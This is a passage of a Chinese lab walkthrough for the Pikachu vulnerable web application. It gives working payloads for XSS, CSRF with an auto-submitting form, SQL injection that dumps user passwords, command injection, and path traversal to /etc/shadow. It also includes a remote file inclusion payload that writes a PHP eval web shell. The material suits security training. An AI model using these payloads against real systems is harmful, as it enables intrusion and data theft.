+<span class="line" data-line="2"><span style="color:#6A737D">// 这段代码前端开发还是挺常用的 javascript:;</span></span></code></pre>
+<p><img src="https://img.5ime.cn/pikachu/image23.png" alt="图片"></p>
+<h3 id="xss之js输出">xss之js输出</h3>
+<p>找到了这段 <code>js</code> 直接闭合</p>
+<p><img src="https://img.5ime.cn/pikachu/image24.png" alt="图片"></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="js"><code><span class="line" data-line="1"><span style="color:#9ECBFF">'; alert(1);/</span><span style="color:#FDAEB7;font-style:italic">/</span></span></code></pre>
+<p><img src="https://img.5ime.cn/pikachu/image25.png" alt="图片"></p>
+<h2 id="csrf">CSRF</h2>
+<h3 id="csrfget">CSRF(get)</h3>
+<p>点击提示给了一些账号密码，随便登录一个(我登录的 <code>vince</code> )点击修改信息，看看请求信息。</p>
+<p><img src="https://img.5ime.cn/pikachu/image26.png" alt="图片"></p>
+<p><img src="https://img.5ime.cn/pikachu/image27.png" alt="图片"></p>
+<p>我们发现是 <code>get</code> 请求 提交了些参数 构造一下发给其他人</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>csrf_get_edit.php?sex=boy&#x26;phonenum=12345678910&#x26;add=chain&#x26;email=hacker%40pikachu.com&#x26;submit=submit</span></span></code></pre>
+<p>方便区分 我用 <code>无痕模式</code> 登录 <code>allen</code> 用户</p>
+<p><img src="https://img.5ime.cn/pikachu/image28.png" alt="图片"></p>
+<p>然后访问我们构造的链接，可以看到信息变了</p>
+<p><img src="https://img.5ime.cn/pikachu/image29.png" alt="图片"></p>
+<p>现实中可以 用图片或者超链接来诱骗点击。</p>
+<h3 id="csrfpost">CSRF(post)</h3>
+<p>和上一关一样 只不过 <code>get</code> 变成了 <code>post</code></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>sex=boy&#x26;phonenum=18626545453&#x26;add=chain&#x26;email=vince%40pikachu.com&#x26;submit=submit</span></span></code></pre>
+<p><img src="https://img.5ime.cn/pikachu/image30.png" alt="图片"></p>
+<p>我们构造一下</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>sex=boy&#x26;phonenum=11111111111&#x26;add=攻击成功&#x26;email=vince%40pikachu.com&#x26;submit=submit</span></span></code></pre>
+<p>写个 <code>html</code> 自动提交的表单 实际中还可以提交完自动跳转，降低受害者警觉</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="html"><code><span class="line" data-line="1"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">></span></span>
+<span class="line" data-line="2"><span style="color:#B392F0">setTimeout</span><span style="color:#E1E4E8">(</span><span style="color:#F97583">function</span><span style="color:#E1E4E8">() {</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">         document.</span><span style="color:#B392F0">getElementById</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">"submit"</span><span style="color:#E1E4E8">).</span><span style="color:#B392F0">click</span><span style="color:#E1E4E8">();</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">}, </span><span style="color:#79B8FF">1000</span><span style="color:#E1E4E8">);</span><span style="color:#6A737D">//延迟1秒</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">script</span><span style="color:#E1E4E8">></span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">&#x3C;</span><span style="color:#85E89D">form</span><span style="color:#B392F0"> action</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"http://pikachu.la/vul/csrf/csrfpost/csrf_post_edit.php"</span><span style="color:#B392F0"> method</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"post"</span><span style="color:#E1E4E8">></span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">    &#x3C;</span><span style="color:#85E89D">p</span><span style="color:#B392F0"> class</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"per_name"</span><span style="color:#E1E4E8">>姓名:allen&#x3C;/</span><span style="color:#85E89D">p</span><span style="color:#E1E4E8">></span></span>
+<span class="line" data-line="8"><span style="color:#E1E4E8">    &#x3C;</span><span style="color:#85E89D">p</span><span style="color:#B392F0"> class</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"per_sex"</span><span style="color:#E1E4E8">>性别:&#x3C;</span><span style="color:#85E89D">input</span><span style="color:#B392F0"> type</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"text"</span><span style="color:#B392F0"> name</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"sex"</span><span style="color:#B392F0"> value</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"boy"</span><span style="color:#E1E4E8">>&#x3C;/</span><span style="color:#85E89D">p</span><span style="color:#E1E4E8">></span></span>
+<span class="line" data-line="9"><span style="color:#E1E4E8">    &#x3C;</span><span style="color:#85E89D">p</span><span style="color:#B392F0"> class</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"per_phone"</span><span style="color:#E1E4E8">>手机:&#x3C;</span><span style="color:#85E89D">input</span><span style="color:#B392F0"> class</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"phonenum"</span><span style="color:#B392F0"> type</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"text"</span><span style="color:#B392F0"> name</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"phonenum"</span><span style="color:#B392F0"> value</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"2222222222"</span><span style="color:#E1E4E8">>&#x3C;/</span><span style="color:#85E89D">p</span><span style="color:#E1E4E8">>    </span></span>
+<span class="line" data-line="10"><span style="color:#E1E4E8">    &#x3C;</span><span style="color:#85E89D">p</span><span style="color:#B392F0"> class</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"per_add"</span><span style="color:#E1E4E8">>住址:&#x3C;</span><span style="color:#85E89D">input</span><span style="color:#B392F0"> class</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"add"</span><span style="color:#B392F0"> type</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"text"</span><span style="color:#B392F0"> name</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"add"</span><span style="color:#B392F0"> value</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"攻击成功"</span><span style="color:#E1E4E8">>&#x3C;/</span><span style="color:#85E89D">p</span><span style="color:#E1E4E8">> </span></span>
+<span class="line" data-line="11"><span style="color:#E1E4E8">    &#x3C;</span><span style="color:#85E89D">p</span><span style="color:#B392F0"> class</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"per_email"</span><span style="color:#E1E4E8">>邮箱:&#x3C;</span><span style="color:#85E89D">input</span><span style="color:#B392F0"> class</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"email"</span><span style="color:#B392F0"> type</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"text"</span><span style="color:#B392F0"> name</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"email"</span><span style="color:#B392F0"> value</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"vince@pikachu.com"</span><span style="color:#E1E4E8">>&#x3C;/</span><span style="color:#85E89D">p</span><span style="color:#E1E4E8">> </span></span>
+<span class="line" data-line="12"><span style="color:#E1E4E8">    &#x3C;</span><span style="color:#85E89D">input</span><span style="color:#B392F0"> class</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"sub"</span><span style="color:#B392F0"> type</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"submit"</span><span style="color:#B392F0"> name</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"submit"</span><span style="color:#B392F0"> id</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"submit"</span><span style="color:#B392F0"> value</span><span style="color:#E1E4E8">=</span><span style="color:#9ECBFF">"submit"</span><span style="color:#E1E4E8">></span></span>
+<span class="line" data-line="13"><span style="color:#E1E4E8">&#x3C;/</span><span style="color:#85E89D">form</span><span style="color:#E1E4E8">></span></span></code></pre>
+<p><img src="https://img.5ime.cn/pikachu/image31.png" alt="图片"></p>
+<h3 id="csrf-token">CSRF Token</h3>
+<p>修改信息新加了 <code>动态Token</code> 有个骚操作 但是存在 <code>跨域问题</code> 所以做不出</p>
+<p><img src="https://img.5ime.cn/pikachu/image32.png" alt="图片"></p>
+<h2 id="sql-inject">Sql Inject</h2>
+<h3 id="数字型注入post">数字型注入(post)</h3>
+<p>直接 <code>burp</code> 抓包用 <code>重发器</code></p>
+<p><img src="https://img.5ime.cn/pikachu/image33.png" alt="图片"></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line" data-line="1"><span style="color:#E1E4E8">查字段：</span><span style="color:#79B8FF">1</span><span style="color:#F97583"> order by</span><span style="color:#79B8FF"> 2</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">查字段：</span><span style="color:#79B8FF">1</span><span style="color:#F97583"> order by</span><span style="color:#79B8FF"> 3</span><span style="color:#E1E4E8"> #报错，所以只有两个字段</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">查当前库名：</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#F97583"> union</span><span style="color:#F97583"> select</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">database</span><span style="color:#E1E4E8">()</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">查所有库名：</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#F97583"> union</span><span style="color:#F97583"> select</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">,group_concat(schema_name) </span><span style="color:#F97583">from</span><span style="color:#79B8FF"> information_schema</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">schemata</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">查表名：</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#F97583"> union</span><span style="color:#F97583"> select</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">,group_concat(table_name) </span><span style="color:#F97583">from</span><span style="color:#79B8FF"> information_schema</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">tables</span><span style="color:#F97583"> where</span><span style="color:#E1E4E8"> table_schema</span><span style="color:#F97583">=database</span><span style="color:#E1E4E8">()</span></span>
+<span class="line" data-line="6"><span style="color:#E1E4E8">查字段：</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#F97583"> union</span><span style="color:#F97583"> select</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">,group_concat(column_name) </span><span style="color:#F97583">from</span><span style="color:#79B8FF"> information_schema</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">columns</span><span style="color:#F97583"> where</span><span style="color:#E1E4E8"> table_name</span><span style="color:#F97583">=</span><span style="color:#9ECBFF">'users'</span></span>
+<span class="line" data-line="7"><span style="color:#E1E4E8">查值：</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#F97583"> union</span><span style="color:#F97583"> select</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">,group_concat(</span><span style="color:#F97583">password</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">from</span><span style="color:#79B8FF"> pikachu</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">users</span><span style="color:#E1E4E8"> </span></span></code></pre>
+<h3 id="字符型注入">字符型注入</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line" data-line="1"><span style="color:#E1E4E8">查字段：</span><span style="color:#79B8FF">1</span><span style="color:#9ECBFF">' order by 2 #</span></span>
+<span class="line" data-line="2"><span style="color:#9ECBFF">查当前库名：-1'</span><span style="color:#F97583"> union</span><span style="color:#F97583"> select</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">database</span><span style="color:#E1E4E8">() #</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">查所有库名：</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#9ECBFF">' union select 1,group_concat(schema_name) from information_schema.schemata #</span></span>
+<span class="line" data-line="4"><span style="color:#9ECBFF">查表名：-1'</span><span style="color:#F97583"> union</span><span style="color:#F97583"> select</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">,group_concat(table_name) </span><span style="color:#F97583">from</span><span style="color:#79B8FF"> information_schema</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">tables</span><span style="color:#F97583"> where</span><span style="color:#E1E4E8"> table_schema</span><span style="color:#F97583">=database</span><span style="color:#E1E4E8">() #</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">查字段：</span><span style="color:#F97583">-</span><span style="color:#79B8FF">1</span><span style="color:#9ECBFF">' union select 1,group_concat(column_name) from information_schema.columns where table_name='</span><span style="color:#E1E4E8">users</span><span style="color:#9ECBFF">' #</span></span>
+<span class="line" data-line="6"><span style="color:#9ECBFF">查值：-1'</span><span style="color:#F97583"> union</span><span style="color:#F97583"> select</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">,group_concat(</span><span style="color:#F97583">password</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">from</span><span style="color:#79B8FF"> pikachu</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">users</span><span style="color:#E1E4E8"> #</span></span></code></pre>
+<h3 id="搜索型注入">搜索型注入</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line" data-line="1"><span style="color:#E1E4E8">查字段：a%</span><span style="color:#9ECBFF">' order by 3 #</span></span>
+<span class="line" data-line="2"><span style="color:#9ECBFF">查当前库名：a%'</span><span style="color:#F97583"> union</span><span style="color:#F97583"> select</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">database</span><span style="color:#E1E4E8">() #</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">查所有库名：a%</span><span style="color:#9ECBFF">' union select 1,2,group_concat(schema_name) from information_schema.schemata #</span></span>
+<span class="line" data-line="4"><span style="color:#9ECBFF">查表名：a%'</span><span style="color:#F97583"> union</span><span style="color:#F97583"> select</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">,group_concat(table_name) </span><span style="color:#F97583">from</span><span style="color:#79B8FF"> information_schema</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">tables</span><span style="color:#F97583"> where</span><span style="color:#E1E4E8"> table_schema</span><span style="color:#F97583">=database</span><span style="color:#E1E4E8">() #</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">查字段：a%</span><span style="color:#9ECBFF">' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='</span><span style="color:#E1E4E8">users</span><span style="color:#9ECBFF">' #</span></span>
+<span class="line" data-line="6"><span style="color:#9ECBFF">查值：a%'</span><span style="color:#F97583"> union</span><span style="color:#F97583"> select</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">,</span><span style="color:#79B8FF">2</span><span style="color:#E1E4E8">,group_concat(</span><span style="color:#F97583">password</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">from</span><span style="color:#79B8FF"> pikachu</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">users</span><span style="color:#E1E4E8"> #</span></span></code></pre>
+<h3 id="xx型注入">xx型注入</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="sql"><code><span class="line" data-line="1"><span style="color:#E1E4E8">查字段：</span><span style="color:#79B8FF">1</span><span style="color:#9ECBFF">') order by 2 #</span></span>
+<span class="line" data-line="2"><span style="color:#9ECBFF">查当前库名：1'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">union</span><span style="color:#F97583"> select</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">,</span><span style="color:#F97583">database</span><span style="color:#E1E4E8">() #</span></span>
+<span class="line" data-line="3"><span style="color:#E1E4E8">查所有库名：</span><span style="color:#79B8FF">1</span><span style="color:#9ECBFF">') union select 1,group_concat(schema_name) from information_schema.schemata #</span></span>
+<span class="line" data-line="4"><span style="color:#9ECBFF">查表名：1'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">union</span><span style="color:#F97583"> select</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">,group_concat(table_name) </span><span style="color:#F97583">from</span><span style="color:#79B8FF"> information_schema</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">tables</span><span style="color:#F97583"> where</span><span style="color:#E1E4E8"> table_schema</span><span style="color:#F97583">=database</span><span style="color:#E1E4E8">() #</span></span>
+<span class="line" data-line="5"><span style="color:#E1E4E8">查字段：</span><span style="color:#79B8FF">1</span><span style="color:#9ECBFF">') union select 1,group_concat(column_name) from information_schema.columns where table_name='</span><span style="color:#E1E4E8">users</span><span style="color:#9ECBFF">' #</span></span>
+<span class="line" data-line="6"><span style="color:#9ECBFF">查值：1'</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">union</span><span style="color:#F97583"> select</span><span style="color:#79B8FF"> 1</span><span style="color:#E1E4E8">,group_concat(</span><span style="color:#F97583">password</span><span style="color:#E1E4E8">) </span><span style="color:#F97583">from</span><span style="color:#79B8FF"> pikachu</span><span style="color:#E1E4E8">.</span><span style="color:#79B8FF">users</span><span style="color:#E1E4E8"> #</span></span></code></pre>
+<h2 id="rce">RCE</h2>
+<h3 id="exec-ping">exec “ping”</h3>
+<p><strong>命令拼接符</strong></p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th align="left"><strong>windows</strong></th><th align="left"></th></tr></thead><tbody><tr><td align="left">|</td><td align="left">管道符，前面命令标准输出，后面命令的标准输入</td></tr><tr><td align="left">&#x26;</td><td align="left">A &#x26; B 先运行命令A然后运行命令B</td></tr><tr><td align="left">||</td><td align="left">A || B 运行命令A，如果失败则运行命令B</td></tr><tr><td align="left">&#x26;&#x26;</td><td align="left">A &#x26;&#x26; B 运行命令A，如果成功则运行命令B</td></tr></tbody></table>
+<hr>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+<table><thead><tr><th align="left"><strong>linux</strong></th><th align="left"></th></tr></thead><tbody><tr><td align="left">|</td><td align="left">管道符，前面命令标准输出，后面命令的标准输入</td></tr><tr><td align="left">&#x26;</td><td align="left">A &#x26; B 先运行命令A然后运行命令B</td></tr><tr><td align="left">||</td><td align="left">A || B 运行命令A，如果失败则运行命令B</td></tr><tr><td align="left">&#x26;&#x26;</td><td align="left">A &#x26;&#x26; B 运行命令A，如果成功则运行命令B</td></tr><tr><td align="left">;</td><td align="left">A;B 执行完A执行B</td></tr><tr><td align="left">%0a</td><td align="left">换行符</td></tr><tr><td align="left">%0d</td><td align="left">回车符</td></tr></tbody></table>
+<p><img src="https://img.5ime.cn/pikachu/image34.png" alt="图片"></p>
+<p>可以直接用 <code>cmd</code> 新建用户之类的</p>
+<h3 id="exec-evel">exec “evel”</h3>
+<p><strong>PHP命令执行函数</strong></p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#79B8FF">system</span><span style="color:#E1E4E8">()</span><span style="color:#B392F0">、exec</span><span style="color:#E1E4E8">()</span><span style="color:#B392F0">、shell_exec</span><span style="color:#E1E4E8">()</span><span style="color:#B392F0">、passthru</span><span style="color:#E1E4E8">()</span><span style="color:#B392F0">、pcntl_exec</span><span style="color:#E1E4E8">()</span><span style="color:#B392F0">、popen</span><span style="color:#E1E4E8">()</span><span style="color:#B392F0">、proc_popen</span><span style="color:#E1E4E8">()</span><span style="color:#79B8FF">等</span></span></code></pre>
+<p><img src="https://img.5ime.cn/pikachu/image35.png" alt="图片"></p>
+<h2 id="file-inclusion">File Inclusion</h2>
+<h3 id="file-inclusionlocal">File Inclusion(local)</h3>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">if</span><span style="color:#E1E4E8">(</span><span style="color:#79B8FF">isset</span><span style="color:#E1E4E8">($_GET[</span><span style="color:#9ECBFF">'submit'</span><span style="color:#E1E4E8">])</span><span style="color:#F97583"> &#x26;&#x26;</span><span style="color:#E1E4E8"> $_GET[</span><span style="color:#9ECBFF">'filename'</span><span style="color:#E1E4E8">]</span><span style="color:#F97583">!=</span><span style="color:#79B8FF">null</span><span style="color:#E1E4E8">){</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">    $filename</span><span style="color:#F97583">=</span><span style="color:#E1E4E8">$_GET[</span><span style="color:#9ECBFF">'filename'</span><span style="color:#E1E4E8">];</span></span>
+<span class="line" data-line="3"><span style="color:#79B8FF">    include </span><span style="color:#9ECBFF">"include/</span><span style="color:#E1E4E8">$filename</span><span style="color:#9ECBFF">"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="4"><span style="color:#E1E4E8">}</span></span></code></pre>
+<p><code>isset</code> 检测变量是否存在，然后同时 <code>filename</code> 不为空，<code>GET</code> 后直接包含进了 <code>include</code>。
+直接修改 <code>filename</code> 参数即可</p>
+<p><img src="https://img.5ime.cn/pikachu/image36.png" alt="图片"></p>
+<h3 id="file-inclusionremote">File Inclusion(remote)</h3>
+<p>PHP的配置选项 <code>allow_url_include</code> 为 <code>ON</code> 的话，则 <code>include</code> / <code>require</code> 函数可以 <code>加载远程文件</code></p>
+<p>这个远程文件包含和上面的本地文件包含代码一样，同样没做安全限制</p>
+<p>在<code>txt</code>写段代码，然后使用<code>远程包含漏洞</code>可以自动创建一句话<code>php</code>文件</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="php"><code><span class="line" data-line="1"><span style="color:#F97583">&#x3C;?</span><span style="color:#79B8FF">php</span></span>
+<span class="line" data-line="2"><span style="color:#E1E4E8">  $shell </span><span style="color:#F97583">=</span><span style="color:#9ECBFF"> "&#x3C;?php @eval(@</span><span style="color:#79B8FF">\$</span><span style="color:#9ECBFF">_POST['cmd']); ?>"</span><span style="color:#E1E4E8">;</span></span>
+<span class="line" data-line="3"><span style="color:#79B8FF">  file_put_contents</span><span style="color:#E1E4E8">(</span><span style="color:#9ECBFF">'./shell.php'</span><span style="color:#E1E4E8">,$shell);</span></span>
+<span class="line" data-line="4"><span style="color:#F97583">?></span></span></code></pre>
+<p>请求之后发现页面没报错 同时目录下新建了个 <code>shell.php</code>，同时一句话也写入了</p>
+<p><img src="https://img.5ime.cn/pikachu/image37.png" alt="图片"></p>
+<p><img src="https://img.5ime.cn/pikachu/image38.png" alt="图片"></p>
+<h2 id="unsafe-filedownload">Unsafe Filedownload</h2>
+<h3 id="unsafe-filedownload-1">Unsafe Filedownload</h3>
+<p>可以构造一下下载的文件通过 <code>../../</code> 控制目录，例如：</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>http://pikachu.la/vul/unsafedownload/execdownload.php?filename=../../../README.md</span></span></code></pre>
+<p>如果是 <code>linux</code> 的话还可以下载 <code>/etc/passwd</code> 和 <code>/etc/shadow</code></p>
+<h2 id="unsafe-fileupload">Unsafe Fileupload</h2>
+<p>之前做过<code>upload-labs</code>：<a href="https://5ime.cn/upload-labs.html?fileGuid=PrrVr3dprrQvVT6Q">https://5ime.cn/upload-labs.html</a></p>
+<h3 id="client-check">client check</h3>
+<p>上传了一个 <code>php</code> 文件 弹窗警告 感觉应该是 <code>js前端校验</code></p>
+<p><img src="https://img.5ime.cn/pikachu/image39.png" alt="图片"></p>
+<p>禁用 <code>js</code> 会后上传成功</p>
+<p><img src="https://img.5ime.cn/pikachu/image40.png" alt="图片"></p>
+<h3 id="mime-type">MIME type</h3>
+<p>上传 <code>php</code> 出现提示文字</p>
+<p><img src="https://img.5ime.cn/pikachu/image41.png" alt="图片"></p>
+<p>直接 <code>burp</code> 抓包修改 <code>content-Type</code> 绕过</p>
+<p><img src="https://img.5ime.cn/pikachu/image42.png" alt="图片"></p>
+<h3 id="getimagesize">getimagesize</h3>
+<p>这关直接参考我之前的文章</p>
+<p>生成图片马：<a href="https://5ime.cn/upload-labs.html#%E7%AC%AC14%E5%85%B3?fileGuid=PrrVr3dprrQvVT6Q">https://5ime.cn/upload-labs.html#%E7%AC%AC14%E5%85%B3</a></p>
+<p><code>getimagesize</code> 绕过参考我以前的文章：<a href="https://5ime.cn/upload-labs.html#%E7%AC%AC15%E5%85%B3?fileGuid=PrrVr3dprrQvVT6Q">https://5ime.cn/upload-labs.html#%E7%AC%AC15%E5%85%B3</a></p>
+<h2 id="over-permission">Over Permission</h2>
+<h3 id="水平越权">水平越权</h3>
+<p><strong>A用户和B用户属于同一级别用户，但各自不能操作对方个人信息。A用户如果越权操作B用户个人信息的情况称为水平越权操作。</strong></p>
+<p><img src="https://img.5ime.cn/pikachu/image43.png" alt="图片"></p>
+<p>修改 <code>username</code> 的参数值 即可查看其他用户的信息</p>
+<p><img src="https://img.5ime.cn/pikachu/image44.png" alt="图片"></p>
+<h3 id="垂直越权">垂直越权</h3>
+<p><strong>A用户权限高于B用户，B用户越权操作A用户的权限的情况称为垂直越权。</strong></p>
+<p>我们浏览器登录 <code>admin</code> 用户 复制添加用户的 <code>url</code> 地址 使用无痕窗口登录普通用户 <code>pikachu</code>，访问刚才复制的添加用户的 <code>url</code> 地址。此时普通用户也可以正常访问(未授权访问) 点击创建后跳转到了登录页面</p>
+<p><img src="https://img.5ime.cn/pikachu/image45.png" alt="图片"></p>
+<p><img src="https://img.5ime.cn/pikachu/image46.png" alt="图片"></p>
+<p>此时我们用 <code>admin</code> 查看用户列表 发现刚才我们使用 <code>pikachu</code> 新建的用户增加成功了。</p>
+<p><img src="https://img.5ime.cn/pikachu/image47.png" alt="图片"></p>
+<h2 id="">../../</h2>
+<h3 id="目录遍历">目录遍历</h3>
+<p><img src="https://img.5ime.cn/pikachu/image48.png" alt="图片"></p>
+<p>如果是 <code>linux</code> 还可以遍历 <code>/etc/shadow</code> 和 <code>/etc/passwd</code></p>
+<h2 id="敏感信息泄露">敏感信息泄露</h2>
+<h3 id="icanseeyourabc">IcanseeyourABC</h3>
+<p>直接在 <code>注释</code> 找到了 <code>账号密码</code></p>
+<p><img src="https://img.5ime.cn/pikachu/image49.png" alt="图片"></p>
+<h2 id="url重定向">URL重定向</h2>
+<h3 id="不安全的url跳转">不安全的URL跳转</h3>
+<p><code>f12</code> 看到 <code>第三个</code> 有个 <code>参数</code> 我们直接构造</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>http://pikachu.la/vul/urlredirect/urlredirect.php?url=https://www.baidu.com&#x26;fileGuid=PrrVr3dprrQvVT6Q</span></span></code></pre>
+<p><img src="https://img.5ime.cn/pikachu/image50.png" alt="图片"></p>
+<p>发现网页跳转到了百度</p>
+<p><img src="https://img.5ime.cn/pikachu/image51.png" alt="图片"></p>
+<p>这种漏洞用来钓鱼挺不错)</p>
+<h2 id="ssrf">SSRF</h2>
+<h3 id="ssrfcurl">SSRF(curl)</h3>
+<p>我们直接构造</p>
+<pre class="astro-code github-dark line-numbers" style="background-color:#24292e;color:#e1e4e8; overflow-x: auto;" tabindex="0" data-language="plaintext"><code><span class="line" data-line="1"><span>http://pikachu.la/vul/ssrf/ssrf_curl.php?url=https://www.baidu.com&#x26;fileGuid=PrrVr3dprrQvVT6Q</span></span></code></pre>
+<p><img src="https://img.5ime.cn/pikachu/image52.png" alt="图片"></p>
+<p>或者用 <code>file协议</code></p>
+<p><img src="https://img.5ime.cn/pikachu/image53.png" alt="图片"></p>
+<p>或者 <code>端口</code></p>
+<p><img src="https://img.5ime.cn/pikachu/image54.png" alt="图片"></p>
+<h3 id="ssrffile_get_content">SSRF(file_get_content)</h3>
